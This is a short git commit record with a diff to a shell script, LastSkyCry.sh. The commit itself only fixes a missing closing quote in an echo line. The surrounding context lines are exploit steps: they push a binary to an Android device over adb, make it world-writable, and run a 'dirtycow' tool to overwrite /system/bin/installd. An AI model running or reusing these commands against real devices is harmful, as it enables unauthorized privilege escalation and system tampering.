50abc05bb47e92f25c7a2da3965a509f9c6a5cc6
MAVProxyUser <kf@digitalmunition.com>
2017-09-01 14:18:51 -0400

    Fix missing "

--- LastSkyCry.sh
+++ LastSkyCry.sh
@@ -5,4 +5,4 @@ adb push installd /data/local/tmp/installd
 echo "Running exploit, may take some time"
 adb shell 'chmod 777 /data/local/tmp/installd'
 adb shell '/data/local/tmp/dirtycow /system/bin/installd /data/local/tmp/installd'
-echo "Install what ever you want now via 'adb install'
+echo "Install what ever you want now via 'adb install'"
